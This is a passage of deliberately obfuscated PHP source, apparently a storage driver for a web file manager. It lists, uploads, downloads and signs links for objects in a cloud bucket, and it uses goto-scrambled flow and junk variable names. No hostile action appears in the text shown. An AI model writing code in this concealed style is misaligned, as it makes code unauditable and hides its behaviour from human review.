$CÑˆëç¢Ωƒ = array($a¨¿ßÖ‘ÆÏ[1353], $a¨¿ßÖ‘ÆÏ[1354] . $bÉ–∏›”≠Î); if ($Bé”óà⁄´†) { $CÑˆëç¢Ωƒ[] = $a¨¿ßÖ‘ÆÏ[1355] . $Bé”óà⁄´†; } $Cœ◊òû•Öú = $this->ussRequest($Cò·•–ÉŸ´, $a¨¿ßÖ‘ÆÏ[228], !1, $CÑˆëç¢Ωƒ); return !$Cœ◊òû•Öú[$a¨¿ßÖ‘ÆÏ[1095]] ? !1 : $Cœ◊òû•Öú[$a¨¿ßÖ‘ÆÏ[1097]]; } private function fileList($E™Ì˘∞Êî≈, &$DÎ∂≠Íû¬≠, &$EÂéﬁûæ›Î, $E‹ﬂà¬˘äà = false) { goto c¡îﬁæÉ≥ü; A÷Ø‚…ÎüÇ: if ($C—Ôêù∂ŸÚ) { $this->cacheMethod($AŸµÉ≠‰¬≥[199], $E™Ì˘∞Êî≈, !0); } goto F∆á¥”çå§; cƒ„§ˆ“¢∑: $e¢ê§ëäŸª = rtrim($E™Ì˘∞Êî≈, $AŸµÉ≠‰¬≥[8]) . $AŸµÉ≠‰¬≥[8]; $C—Ôêù∂ŸÚ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $bìÕåÿ≤Ç§ = $this->listObjs($E™Ì˘∞Êî≈, $aàâ≠Í”ï∂, $f£´ÁÉ“¢“); if (!$bìÕåÿ≤Ç§) { return !1; } $aàâ≠Í”ï∂ = isset($bìÕåÿ≤Ç§[$AŸµÉ≠‰¬≥[1356]]) ? $bìÕåÿ≤Ç§[$AŸµÉ≠‰¬≥[1356]] : $AŸµÉ≠‰¬≥[33]; $AÍÜÖ∫Î…‹ = isset($bìÕåÿ≤Ç§[$AŸµÉ≠‰¬≥[1357]]) ? $bìÕåÿ≤Ç§[$AŸµÉ≠‰¬≥[1357]] : array(); foreach ($AÍÜÖ∫Î…‹ as $C∏çÓ∂´≈¬) { $CŒêú¡Ú∆≤ = $C∏çÓ∂´≈¬[$AŸµÉ≠‰¬≥[29]] == $AŸµÉ≠‰¬≥[77] ? !0 : !1; $b‰‘¡€äà‰ = ltrim($e¢ê§ëäŸª . $C∏çÓ∂´≈¬[$AŸµÉ≠‰¬≥[28]], $AŸµÉ≠‰¬≥[8]) . ($CŒêú¡Ú∆≤ ? $AŸµÉ≠‰¬≥[8] : $AŸµÉ≠‰¬≥[33]); $BÃú÷ê¬˜¨ = array($AŸµÉ≠‰¬≥[28] => $b‰‘¡€äà‰, $AŸµÉ≠‰¬≥[29] => $CŒêú¡Ú∆≤ ? $AŸµÉ≠‰¬≥[77] : $AŸµÉ≠‰¬≥[193], $AŸµÉ≠‰¬≥[78] => $C∏çÓ∂´≈¬[$AŸµÉ≠‰¬≥[335]], $AŸµÉ≠‰¬≥[1352] => $C∏çÓ∂´≈¬[$AŸµÉ≠‰¬≥[1358]]); if ($C—Ôêù∂ŸÚ) { $this->cacheMethod($AŸµÉ≠‰¬≥[199], $b‰‘¡€äà‰, $CŒêú¡Ú∆≤); $this->cacheMethod($AŸµÉ≠‰¬≥[200], $b‰‘¡€äà‰, $BÃú÷ê¬˜¨); } if ($CŒêú¡Ú∆≤) { $DÎ∂≠Íû¬≠[] = $b‰‘¡€äà‰; if ($E‹ﬂà¬˘äà) { $this->fileList($b‰‘¡€äà‰, $DÎ∂≠Íû¬≠, $EÂéﬁûæ›Î, $E‹ﬂà¬˘äà); } continue; } $EÂéﬁûæ›Î[] = $BÃú÷ê¬˜¨; } if (count($AÍÜÖ∫Î…‹) < $f£´ÁÉ“¢“) { break; } } goto A÷Ø‚…ÎüÇ; c¡îﬁæÉ≥ü: $AŸµÉ≠‰¬≥ =& $_SERVER[Öíæ€“”≠éÏË]; $aàâ≠Í”ï∂ = $AŸµÉ≠‰¬≥[33]; $f£´ÁÉ“¢“ = 1000; goto cƒ„§ˆ“¢∑; F∆á¥”çå§: } public function listPath($BÑ¿∑ÖÿÛú, $b⁄»·ÕîÊ® = false) { $E¿í˜ı⁄§⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $D÷≥ªõ≤Ù◊ = $FŸ«Ö„Ê†‚ = array(); $this->fileList($BÑ¿∑ÖÿÛú, $D÷≥ªõ≤Ù◊, $FŸ«Ö„Ê†‚); foreach ($D÷≥ªõ≤Ù◊ as $aﬂáÙ∆≤≥ø => $b—¢‰¢¢è ) { $D÷≥ªõ≤Ù◊[$aﬂáÙ∆≤≥ø] = $this->folderInfo($b—¢‰¢¢è , $b⁄»·ÕîÊ®); } foreach ($FŸ«Ö„Ê†‚ as $aﬂáÙ∆≤≥ø => $b—¢‰¢¢è ) { $FŸ«Ö„Ê†‚[$aﬂáÙ∆≤≥ø] = $this->fileInfo($b—¢‰¢¢è [$E¿í˜ı⁄§⁄[28]], $b⁄»·ÕîÊ®, $b—¢‰¢¢è ); } return array($E¿í˜ı⁄§⁄[75] => $D÷≥ªõ≤Ù◊, $E¿í˜ı⁄§⁄[74] => $FŸ«Ö„Ê†‚); } public function has($bÀÌï¥àä¿, $bÆ«µ’ò”≈ = false, $c≈€çñ÷Û∫ = true) { goto c—óçúêØ¶; c—óçúêØ¶: $dûàº¨Öﬁ’ =& $_SERVER[Öíæ€“”≠éÏË]; $f„êÜµ“Í— = $dûàº¨Öﬁ’[33]; $aü¡òëÖª¶ = 500; goto F¬åëü®ñô; F¬åëü®ñô: $Búùœ±∫ÎÑ = 0; $FÀ›ÉË§Ûµ = 0; $Bñ∂ÍÑî´Æ = rtrim($bÀÌï¥àä¿, $dûàº¨Öﬁ’[8]) . $dûàº¨Öﬁ’[8]; goto d∑≥¢öŒê•; d∑≥¢öŒê•: while (!0) { check_abort(); $C•≈ÙóÃÎê = $this->listObjs($bÀÌï¥àä¿, $f„êÜµ“Í—, $aü¡òëÖª¶); if (!$C•≈ÙóÃÎê) { return !1; } $f„êÜµ“Í— = isset($C•≈ÙóÃÎê[$dûàº¨Öﬁ’[1356]]) ? $C•≈ÙóÃÎê[$dûàº¨Öﬁ’[1356]] : $dûàº¨Öﬁ’[33]; $E≤´·Ãêè– = isset($C•≈ÙóÃÎê[$dûàº¨Öﬁ’[1357]]) ? $C•≈ÙóÃÎê[$dûàº¨Öﬁ’[1357]] : array(); if (empty($E≤´·Ãêè–)) { break; } $B˜±ﬁı™Ö¥ = array_filter($E≤´·Ãêè–, function ($cÔãÂ∆ï§ ) { $a√≠ÿì§∏µ =& $_SERVER[Öíæ€“”≠éÏË]; return $cÔãÂ∆ï§ [$a√≠ÿì§∏µ[29]] == $a√≠ÿì§∏µ[77]; }); $aêçÌòÁΩâ = count($E≤´·Ãêè–); $B˜±ﬁı™Ö¥ = count($B˜±ﬁı™Ö¥); $a®å¿π üÆ = $aêçÌòÁΩâ - $B˜±ﬁı™Ö¥; if ($bÆ«µ’ò”≈) { $FÀ›ÉË§Ûµ += $B˜±ﬁı™Ö¥; $Búùœ±∫ÎÑ += $a®å¿π üÆ; if ($aêçÌòÁΩâ < $aü¡òëÖª¶) { break; } continue; } if ($c≈€çñ÷Û∫) { if ($a®å¿π üÆ) { return !0; } } else { if ($B˜±ﬁı™Ö¥) { return !0; } } if ($aêçÌòÁΩâ < $aü¡òëÖª¶) { break; } } if ($bÆ«µ’ò”≈) { return array($dûàº¨Öﬁ’[203] => $Búùœ±∫ÎÑ, $dûàº¨Öﬁ’[204] => $FÀ›ÉË§Ûµ); } return !1; goto eıŸ°ë¥‡õ; eıŸ°ë¥‡õ: } public function listAll($a◊êπ‡´Ïª) { goto C÷∆¬ùÖÀÆ; Dÿ±ÉﬂºÀÑ: $cçáõÖÁ”© = array(); foreach ($fº‚Ö¥√ŒÊ as $Dô÷æ„è¥ü) { $cçáõÖÁ”©[$Dô÷æ„è¥ü[$cÌÈÆßí„Æ[28]]] = $Dô÷æ„è¥ü[$cÌÈÆßí„Æ[78]]; } foreach ($EÆñëìãÖÂ as $Dô÷æ„è¥ü) { if (is_string($Dô÷æ„è¥ü)) { $cçáõÖÁ”©[$Dô÷æ„è¥ü] = 0; } } goto Aå€Ÿ¬çËµ; Aå€Ÿ¬çËµ: return $this->listAllFiles($a◊êπ‡´Ïª, array_keys($cçáõÖÁ”©), $cçáõÖÁ”©); goto c´π≠ìçñ«; C÷∆¬ùÖÀÆ: $cÌÈÆßí„Æ =& $_SERVER[Öíæ€“”≠éÏË]; $EÆñëìãÖÂ = $fº‚Ö¥√ŒÊ = array(); $this->fileList($a◊êπ‡´Ïª, $EÆñëìãÖÂ, $fº‚Ö¥√ŒÊ, !0); goto Dÿ±ÉﬂºÀÑ; c´π≠ìçñ«: } public function canRead($E∞µê∂¨“å) { return $this->exist($E∞µê∂¨“å) ? !0 : !1; } public function canWrite($BÆù†∑∏Çœ) { return $this->exist($BÆù†∑∏Çœ) ? !0 : !1; } public function getContent($E«’°πå’ ) { return $this->fileSubstr($E«’°πå’ , 0, -1); } public function setContent($C‹¯≠±⁄íÀ, $aªª¨°õ≠ = '') { $eîÉé œŒ¡ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$aªª¨°õ≠) { $b·ëÑÖ«àâ = $this->ussRequest($C‹¯≠±⁄íÀ, $eîÉé œŒ¡[224]); return $b·ëÑÖ«àâ[$eîÉé œŒ¡[1095]]; } $CÊç–ÎŸ≠Â = $this->tempFile($this->pathThis($C‹¯≠±⁄íÀ)); file_put_contents($CÊç–ÎŸ≠Â, $aªª¨°õ≠); if ($this->upload($C‹¯≠±⁄íÀ, $CÊç–ÎŸ≠Â)) { $this->tempFileRemve($CÊç–ÎŸ≠Â); return !0; } return !1; } public function fileSubstr($Bäøãæì¯ƒ, $B≤®õùıÉŒ, $a¨çÿ¶£ö≈) { $d··™¨‹ãË =& $_SERVER[Öíæ€“”≠éÏË]; if (!($Cö≈ÔÑœó÷ = $this->link($Bäøãæì¯ƒ))) { return !1; } $FŒ»°•Ìê• = !1; if ($a¨çÿ¶£ö≈ > 0) { $dèª–Üüá¥ = $B≤®õùıÉŒ + $a¨çÿ¶£ö≈ - 1; $FŒ»°•Ìê• = array($d··™¨‹ãË[1319] . $B≤®õùıÉŒ . $d··™¨‹ãË[441] . $dèª–Üüá¥); } $DÔÍ§Ò’«Ö = url_request($Cö≈ÔÑœó÷, $d··™¨‹ãË[228], !1, $FŒ»°•Ìê•); return $DÔÍ§Ò’«Ö[$d··™¨‹ãË[723]] ? $DÔÍ§Ò’«Ö[$d··™¨‹ãË[1097]] : !1; } public function upload($F†õ‰»ëú≥, $bìÙôõåÃ≠, $EﬂÑ¯¶ò ∫ = false, $fÙÚÃù¯ìë = REPEAT_REPLACE) { goto f†÷íÂ„«ı; a„†Îî¨Œ€: $céåˆΩ∑Õ≈ = $this->ussRequest($F†õ‰»ëú≥, $d≥πÂ◊ô¯ã[226], !1, $fÂúÜëÏﬂ°); return $céåˆΩ∑Õ≈[$d≥πÂ◊ô¯ã[1095]] ? $this->getPathOuter($f¡Îë«åõ„) : !1; goto dßƒèãË≠⁄; AÜÀéá‚Ÿ®: if (!$céåˆΩ∑Õ≈[$d≥πÂ◊ô¯ã[1095]]) { return !1; } $CÏ£î≥Üé™ = $céåˆΩ∑Õ≈[$d≥πÂ◊ô¯ã[1097]]; $eã∑™Ÿı•ß = 0; goto D¢πÁﬂûö; e¡ç±”äÃ‚: $D¢œõÕìÍ≠ = 1024 * 1024 * 10; $fÂúÜëÏﬂ° = array($d≥πÂ◊ô¯ã[1360], $d≥πÂ◊ô¯ã[1361] . $dÜ•ÁëÁŒù, $d≥πÂ◊ô¯ã[1362], $d≥πÂ◊ô¯ã[1363] . $D¢œõÕìÍ≠); $céåˆΩ∑Õ≈ = $this->ussRequest($F†õ‰»ëú≥, $d≥πÂ◊ô¯ã[226], !1, $fÂúÜëÏﬂ°); goto AÜÀéá‚Ÿ®; D¢πÁﬂûö: $Dà¨£ªÖÏµ = $CÏ£î≥Üé™[$d≥πÂ◊ô¯ã[1364]]; $EôﬂﬁÜÚ¡Ü = fopen($bìÙôõåÃ≠, $d≥πÂ◊ô¯ã[1270]); if (!$EôﬂﬁÜÚ¡Ü) { return !1; } goto FΩÁ»∏∫üÁ; f†÷íÂ„«ı: $d≥πÂ◊ô¯ã =& $_SERVER[Öíæ€“”≠éÏË]; $dÜ•ÁëÁŒù = IO::size($bìÙôõåÃ≠); if ($dÜ•ÁëÁŒù <= 1024 * 1024 * 200) { $cπ√Ì∂èÎî = array($d≥πÂ◊ô¯ã[1359] . $bìÙôõåÃ≠); $céåˆΩ∑Õ≈ = $this->ussRequest($F†õ‰»ëú≥, $d≥πÂ◊ô¯ã[226], $cπ√Ì∂èÎî); return $céåˆΩ∑Õ≈[$d≥πÂ◊ô¯ã[1095]] ? $this->getPathOuter($F†õ‰»ëú≥) : !1; } goto e¡ç±”äÃ‚; FΩÁ»∏∫üÁ: do { $E«Ïè∏∞Çâ = $CÏ£î≥Üé™[$d≥πÂ◊ô¯ã[1365]]; fseek_64($EôﬂﬁÜÚ¡Ü, $eã∑™Ÿı•ß); $BöÜ≠‡˘∆ú = fread($EôﬂﬁÜÚ¡Ü, $E«Ïè∏∞Çâ); $d¿Ÿà±≥Ωﬁ = 0; do { $d¿Ÿà±≥Ωﬁ++; $CÏ£î≥Üé™ = $this->uploadPart($F†õ‰»ëú≥, $CÏ£î≥Üé™, $BöÜ≠‡˘∆ú); } while (!$CÏ£î≥Üé™ && $d¿Ÿà±≥Ωﬁ < 3); if (!$CÏ£î≥Üé™) { return !1; } $Dà¨£ªÖÏµ = $CÏ£î≥Üé™[$d≥πÂ◊ô¯ã[1364]]; $eã∑™Ÿı•ß += $E«Ïè∏∞Çâ; } while ($Dà¨£ªÖÏµ != -1); fclose($EôﬂﬁÜÚ¡Ü); $fÂúÜëÏﬂ° = array($d≥πÂ◊ô¯ã[1366], $d≥πÂ◊ô¯ã[1367] . $CÏ£î≥Üé™[$d≥πÂ◊ô¯ã[1368]], $d≥πÂ◊ô¯ã[1362]); goto a„†Îî¨Œ€; dßƒèãË≠⁄: } private function uploadPart($D‰Ã±ËÙå, $b∞Ñ¿πòàî, &$B±ãèπ—©æ) { $fÒƒï˜Á”€ =& $_SERVER[Öíæ€“”≠éÏË]; $Bäéñ…µàë = array($fÒƒï˜Á”€[1369], $fÒƒï˜Á”€[1367] . $b∞Ñ¿πòàî[$fÒƒï˜Á”€[1368]], $fÒƒï˜Á”€[1370] . $b∞Ñ¿πòàî[$fÒƒï˜Á”€[1364]], $fÒƒï˜Á”€[141] . $b∞Ñ¿πòàî[$fÒƒï˜Á”€[1365]]); $Dæ™âóˆõ¯ = $this->ussRequest($D‰Ã±ËÙå, $fÒƒï˜Á”€[226], $B±ãèπ—©æ, $Bäéñ…µàë); return !$Dæ™âóˆõ¯[$fÒƒï˜Á”€[1095]] ? $Dæ™âóˆõ¯[$fÒƒï˜Á”€[1095]] : $Dæ™âóˆõ¯[$fÒƒï˜Á”€[1097]]; } public function uploadFormData($cÃ⁄á◊–Ê´, $AªŸçÒ©ìõ = 3600) { return $this->uploadPolicy($cÃ⁄á◊–Ê´, $AªŸçÒ©ìõ); } public function multiUploadFormData($e∑ê°íŸ•⁄, $fÀ†§ŒßÍ‹ = 3600) { $eùäÜ¥Ωç⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $cøπ‡‚ÓÏË = (int) $GLOBALS[$eùäÜ¥Ωç⁄[7]][$eùäÜ¥Ωç⁄[78]]; return $this->uploadPolicy($e∑ê°íŸ•⁄, $fÀ†§ŒßÍ‹, $cøπ‡‚ÓÏË); } private function uploadPolicy($bπ¶ä‹Ùõ®, $Fùﬂ‰œ∞°œ = 3600, $a®õÙè„Íö = 0) { goto BıˆÌû·€⁄; E•Ñ‘Î«Êõ: $a¥ı’å¡¥¯ = base64_encode(hash_hmac($a€ªìÈâπΩ[1341], "\120\x4f\x53\124\x26{$E≥∑Õ®€…—}\46{$c”ﬁ€ÈÂ¿ﬂ}\x26{$D‡Æê›Ú“à}", md5("{$this->userpass}"), !0)); $D§â›◊„√Ù = array($a€ªìÈâπΩ[1210] => $D‡Æê›Ú“à, $a€ªìÈâπΩ[1375] => "\125\x50\131\x55\116\40{$this->username}\72{$a¥ı’å¡¥¯}", $a€ªìÈâπΩ[175] => $this->endpoint . $E≥∑Õ®€…—); return $D§â›◊„√Ù; goto e∏êà§Îå‰; Eµ¿éÖçúú: $FØ¶ì±Õâ∆ = array($a€ªìÈâπΩ[1371] => $this->bucket, $a€ªìÈâπΩ[1372] => $bπ¶ä‹Ùõ®, $a€ªìÈâπΩ[1373] => time() + $Fùﬂ‰œ∞°œ, $a€ªìÈâπΩ[1374] => $c”ﬁ€ÈÂ¿ﬂ); if ($a®õÙè„Íö) { $FØ¶ì±Õâ∆[$a€ªìÈâπΩ[1286]] = $a®õÙè„Íö; } $D‡Æê›Ú“à = base64_encode(json_encode($FØ¶ì±Õâ∆)); goto E•Ñ‘Î«Êõ; BıˆÌû·€⁄: $a€ªìÈâπΩ =& $_SERVER[Öíæ€“”≠éÏË]; $E≥∑Õ®€…— = $a€ªìÈâπΩ[8] . $this->bucket; $c”ﬁ€ÈÂ¿ﬂ = gmdate($a€ªìÈâπΩ[1306]); goto Eµ¿éÖçúú; e∏êà§Îå‰: } public function download($aÖÑÛƒÈÍç, $a∆Ú†≤“ßÓ) { goto d©áÛœüø; Dí›ãÛö◊Ú: $cÖº†Õª„» = 1024 * 200; $Bﬂî±ëãœÜ = fopen($d£Œë¢Æ∑ı, $_SERVER[Öíæ€“”≠éÏË][1325]); while (!0) { $B“ΩˆäéÂ’ = $this->fileSubstr($aÖÑÛƒÈÍç, $aÆ”†≈§•ü, $cÖº†Õª„»); if ($B“ΩˆäéÂ’ === !1) { return !1; } fwrite($Bﬂî±ëãœÜ, $B“ΩˆäéÂ’); $aÆ”†≈§•ü += $cÖº†Õª„»; if (strlen($B“ΩˆäéÂ’) < $cÖº†Õª„») { break; } } goto D∏è¿üâΩœ; d©áÛœüø: $d£Œë¢Æ∑ı = IO::getPathInner(IO::mkfile($a∆Ú†≤“ßÓ)); if (!($bÈÌçë˘¢ç = $this->link($aÖÑÛƒÈÍç))) { return !1; } $aÆ”†≈§•ü = 0; goto Dí›ãÛö◊Ú; D∏è¿üâΩœ: fclose($Bﬂî±ëãœÜ); return $a∆Ú†≤“ßÓ; goto AöªíÁè¿â; AöªíÁè¿â: } public function link($BÓ∂±« ¿‹, $c†ù©Öõìú = array()) { $dç°ÉΩÎ∂™ =& $_SERVER[Öíæ€“”≠éÏË]; $BÓ∂±« ¿‹ = trim($BÓ∂±« ¿‹, $dç°ÉΩÎ∂™[8]); if (!empty($this->token)) { $AﬁÜ∆Â‹¥ﬁ = strtotime(date($dç°ÉΩÎ∂™[1376])); $F—ºﬁ‰ÏœÜ = substr(md5($this->token . $dç°ÉΩÎ∂™[282] . $AﬁÜ∆Â‹¥ﬁ . $dç°ÉΩÎ∂™[1377] . $BÓ∂±« ¿‹), 12, 8) . $AﬁÜ∆Â‹¥ﬁ; $c†ù©Öõìú[] = $dç°ÉΩÎ∂™[1378] . $F—ºﬁ‰ÏœÜ; } $A™Ù˘Ù¢ÿ› = !empty($c†ù©Öõìú) ? $dç°ÉΩÎ∂™[70] . implode($dç°ÉΩÎ∂™[282], $c†ù©Öõìú) : $dç°ÉΩÎ∂™[33]; return $this->getHost() . $dç°ÉΩÎ∂™[8] . $BÓ∂±« ¿‹ . $A™Ù˘Ù¢ÿ›; } public function fileOut($d´Íàéæû≥, $e ÎΩÊÒ´≠ = false, $Då¿õ§£‰å = false, $BêñÂ¯Ÿ—Û = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($d´Íàéæû≥, $e ÎΩÊÒ´≠, $Då¿õ§£‰å, $BêñÂ¯Ÿ—Û); } if (!$Då¿õ§£‰å) { $Då¿õ§£‰å = $this->pathThis($d´Íàéæû≥); } $d¶ŒºÉç∆Ó = $e ÎΩÊÒ´≠ ? array($_SERVER[Öíæ€“”≠éÏË][1379] . rawurlencode($Då¿õ§£‰å)) : array(); $A‹ œáÇ§“ = $this->link($d´Íàéæû≥, $d¶ŒºÉç∆Ó); $this->fileOutLink($A‹ œáÇ§“); } public function fileOutServer($fı °ƒó”°, $D•ù∏∞ñ∆Í = false, $F∏ù÷ø°É≥ = false, $aë»≥∂‹Çº = '') { parent::fileOut($fı °ƒó”°, $D•ù∏∞ñ∆Í, $F∏ù÷ø°É≥, $aë»≥∂‹Çº); } public function fileOutImage($f•¡⁄Òù∫, $f®Óú˘Áµ‹ = 250) { $a¢¨úà‚÷± = $this->link($f•¡⁄Òù∫ . $_SERVER[Öíæ€“”≠éÏË][1380] . $f®Óú˘Áµ‹); $this->fileOutLink($a¢¨úà‚÷±); } public function fileOutImageServer($FÖÊ≈©ã∫”, $fÇ”àã‹¿¯ = 250) { parent::fileOutImage($FÖÊ≈©ã∫”, $fÇ”àã‹¿¯); } public function hashMd5($dÁµÂ«Õ—à) { $fΩ⁄ﬁ√≥‘ñ =& $_SERVER[Öíæ€“”≠éÏË]; $A€®åæ§œç = $this->_objectMeta($dÁµÂ«Õ—à); return isset($A€®åæ§œç[$fΩ⁄ﬁ√≥‘ñ[208]]) ? $A€®åæ§œç[$fΩ⁄ﬁ√≥‘ñ[208]] : !1; } public function size($côÇÓÒÃéÇ) { $fúçõ§¯∞à = $this->objectMeta($côÇÓÒÃéÇ); return $fúçõ§¯∞à ? $fúçõ§¯∞à[$_SERVER[Öíæ€“”≠éÏË][78]] : 0; } public function info($fÏ´∆ñ·∞ö) { if ($this->isFolder($fÏ´∆ñ·∞ö)) { return $this->folderInfo($fÏ´∆ñ·∞ö); } else { if ($this->isFile($fÏ´∆ñ·∞ö)) { return $this->fileInfo($fÏ´∆ñ·∞ö); } } return !1; } public function exist($cé∏æ√Õª¥) { return $this->isFile($cé∏æ√Õª¥) || $this->isFolder($cé∏æ√Õª¥); } public function isFile($dø¶¥ßÒ§¬) { return !$this->isFolder($dø¶¥ßÒ§¬) && $this->objectMeta($dø¶¥ßÒ§¬); } public function isFolder($A‰‰¬ÆÁ∏) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][199], $A‰‰¬ÆÁ∏); } protected function objectMeta($C©Öñ—ä¯Ø) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][200], $C©Öñ—ä¯Ø); } protected function _objectMeta($aÁ˜›„ôÓ ) { goto c•ç∏ƒª⁄Œ; Bπﬁë¶≥¡≈: if (!$Eó˜ÆµÜúå[$EΩ“ÒÈùë¬[1095]]) { return null; } $Fç˘´⁄æ‘ä = isset($Eó˜ÆµÜúå[$EΩ“ÒÈùë¬[1097]]) ? $Eó˜ÆµÜúå[$EΩ“ÒÈùë¬[1097]] : array(); if (!isset($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1382]])) { return null; } goto aéàÀ•Í◊Ã; c•ç∏ƒª⁄Œ: $EΩ“ÒÈùë¬ =& $_SERVER[Öíæ€“”≠éÏË]; if ($aÁ˜›„ôÓ  == $EΩ“ÒÈùë¬[33] || $aÁ˜›„ôÓ  == $EΩ“ÒÈùë¬[8]) { return array(); } $Eó˜ÆµÜúå = $this->ussRequest($aÁ˜›„ôÓ , $EΩ“ÒÈùë¬[1381]); goto Bπﬁë¶≥¡≈; aéàÀ•Í◊Ã: $cƒ”—˘‰ˆò = array($EΩ“ÒÈùë¬[29] => isset($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1382]]) ? $Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1382]] : null, $EΩ“ÒÈùë¬[78] => isset($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1383]]) ? $Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1383]] : null, $EΩ“ÒÈùë¬[208] => isset($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1384]]) ? $Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1384]] : null, $EΩ“ÒÈùë¬[1351] => isset($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1385]]) ? $Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1385]] : null); $cƒ”—˘‰ˆò[$EΩ“ÒÈùë¬[1352]] = isset($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1386]]) ? strtotime($Fç˘´⁄æ‘ä[$EΩ“ÒÈùë¬[1386]]) : $cƒ”—˘‰ˆò[$EΩ“ÒÈùë¬[1351]]; return $cƒ”—˘‰ˆò; goto AõÙ∞ﬂÃÇ¨; AõÙ∞ﬂÃÇ¨: } protected function _isFolder($b∆€ÇÇ»øí) { $DÏüÆ§µ“∏ =& $_SERVER[Öíæ€“”≠éÏË]; if ($b∆€ÇÇ»øí == $DÏüÆ§µ“∏[33] || $b∆€ÇÇ»øí == $DÏüÆ§µ“∏[8]) { return !0; } $FÉ‘ƒÚ™Ö¬ = $this->_objectMeta($b∆€ÇÇ»øí); return isset($FÉ‘ƒÚ™Ö¬[$DÏüÆ§µ“∏[29]]) && $FÉ‘ƒÚ™Ö¬[$DÏüÆ§µ“∏[29]] == $DÏüÆ§µ“∏[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($b∏ÉÿŸèì› = false) { } public function exist($A‰÷çû¥éπ) { $B◊æÖ∑œèÖ = $this->info($A‰÷çû¥éπ); return $B◊æÖ∑œèÖ[$_SERVER[Öíæ€“”≠éÏË][195]]; } public function isFile($A¢Ã·ö∏ƒÙ) { $b‰Ñ¥ÇÖË´ = $this->info($A¢Ã·ö∏ƒÙ); return $b‰Ñ¥ÇÖË´[$_SERVER[Öíæ€“”≠éÏË][195]]; } public function isFolder($cÃäˆœ÷è≠) { return !1; } public function size($b§≤≥ã√Æ§) { $Dïâéñ¯âÊ = $this->info($b§≤≥ã√Æ§); return $Dïâéñ¯âÊ[$_SERVER[Öíæ€“”≠éÏË][78]]; } public function info($céç‰«°äå) { return $this->infoParse($céç‰«°äå); } public function infoAuth($Dï¡—◊£¨ª) { return $this->infoParse($Dï¡—◊£¨ª); } public function infoWithChildren($Bòıâ ûÑÛ) { return $this->infoParse($Bòıâ ûÑÛ); } public function infoFull($Báï√ìˆ‰) { return $this->infoParse($Báï√ìˆ‰); } private function infoParse($EºÀı›éﬂá) { $a∆∑◊ËãàÌ =& $_SERVER[Öíæ€“”≠éÏË]; $döÛÖëı≈÷ = $this->header($EºÀı›éﬂá); if (!$döÛÖëı≈÷ || !$döÛÖëı≈÷[$a∆∑◊ËãàÌ[723]]) { return !1; } $fΩ«’â›»å = _get($döÛÖëı≈÷, $a∆∑◊ËãàÌ[335], 0); $d∑ÃºçΩÓ◊ = array($a∆∑◊ËãàÌ[28] => $döÛÖëı≈÷[$a∆∑◊ËãàÌ[28]], $a∆∑◊ËãàÌ[76] => $EºÀı›éﬂá, $a∆∑◊ËãàÌ[29] => $a∆∑◊ËãàÌ[193], $a∆∑◊ËãàÌ[78] => intval($fΩ«’â›»å), $a∆∑◊ËãàÌ[168] => get_path_ext($döÛÖëı≈÷[$a∆∑◊ËãàÌ[28]]), $a∆∑◊ËãàÌ[1267] => $fΩ«’â›»å > 0 && $döÛÖëı≈÷[$a∆∑◊ËãàÌ[1387]], $a∆∑◊ËãàÌ[1268] => !1); return $d∑ÃºçΩÓ◊; } private function header($E¡È™πœ¶¬) { goto cŸÒæ´è¶≥; C‡ÌÎú€’: return self::$_cacheHeader[$E¡È™πœ¶¬]; goto e¬∫—¬èé‡; DÇÍÇ¿˜œ…: $GLOBALS[$b√‡‘§¥“ª[1388]] = !0; self::$_cacheHeader[$E¡È™πœ¶¬] = url_header($E¡È™πœ¶¬); $GLOBALS[$b√‡‘§¥“ª[1388]] = $b¨¨ÇÃÎ«≤; goto C‡ÌÎú€’; cŸÒæ´è¶≥: $b√‡‘§¥“ª =& $_SERVER[Öíæ€“”≠éÏË]; if (isset(self::$_cacheHeader[$E¡È™πœ¶¬])) { return self::$_cacheHeader[$E¡È™πœ¶¬]; } $b¨¨ÇÃÎ«≤ = isset($GLOBALS[$b√‡‘§¥“ª[1388]]) ? $GLOBALS[$b√‡‘§¥“ª[1388]] : !1; goto DÇÍÇ¿˜œ…; e¬∫—¬èé‡: } public function hashSimple($aì◊Ô÷“°ø, $aŸ»≈…Œ¯Ê = false) { goto A¢†ı•ÕΩ¿; C∑äñ•ìºÓ: $Fıø™ æÓﬂ = $cûâËœ≤¨€[$A†ãàˆâ≤‘[78]]; $cÔáñäÎÿÍ = 200; $fËˆ±¿ﬁ·∫ = 50; goto AÍÒƒÒÇÒæ; EòÂªŒ¢ã£: $fÒÛáÚòÓ… = timeFloat(); $f£Ï±†óëà = 15; for ($d©⁄¢ÊÖ”ß = 0; $d©⁄¢ÊÖ”ß < $fËˆ±¿ﬁ·∫; $d©⁄¢ÊÖ”ß++) { if (timeFloat() - $fÒÛáÚòÓ… > $f£Ï±†óëà) { return !1; } $C√Ì∫Üè“ã = $this->fileSubstr($aì◊Ô÷“°ø, $FÀÿÓÈ—ÉÒ * $d©⁄¢ÊÖ”ß, $cÔáñäÎÿÍ); if (!$C√Ì∫Üè“ã) { return !1; } $dîπ“¢ÖÆÿ .= $C√Ì∫Üè“ã; } goto D‡Ÿ„¢Öæ±; AÍÒƒÒÇÒæ: if ($Fıø™ æÓﬂ <= $cÔáñäÎÿÍ * $fËˆ±¿ﬁ·∫) { return md5($this->fileSubstr($aì◊Ô÷“°ø, 0, $Fıø™ æÓﬂ)) . $Fıø™ æÓﬂ; } $FÀÿÓÈ—ÉÒ = intval($Fıø™ æÓﬂ / $fËˆ±¿ﬁ·∫); $dîπ“¢ÖÆÿ = 